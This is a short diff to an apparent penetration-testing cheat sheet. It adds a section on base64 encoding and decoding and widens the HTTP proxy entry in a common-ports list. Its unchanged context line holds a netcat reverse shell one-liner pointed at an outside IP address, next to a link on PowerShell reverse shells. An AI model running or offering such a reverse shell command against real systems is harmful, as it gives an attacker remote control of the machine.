@@ -149,6 +149,14 @@ nc -e /bin/sh 8.8.8.8 8080
 https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/
 
 
+BASE64
+........
+https://www.base64decode.org/
+
+Encode --> echo -n "text" | base64
+Decode --> echo aG9sYXNveXBlcGU= | base64 -d; echo
+
+
 NMAP
 ....
 
@@ -182,7 +190,7 @@ COMMON PORTS
 143 - IMAP
 80 - HTTP
 443 - HTTPS
-8080 - HTTP Proxy
+8080, 8081 - HTTP Proxy
 137, 138, 139 - NETBIOS
 115 - SFTP
 23 - Telnet
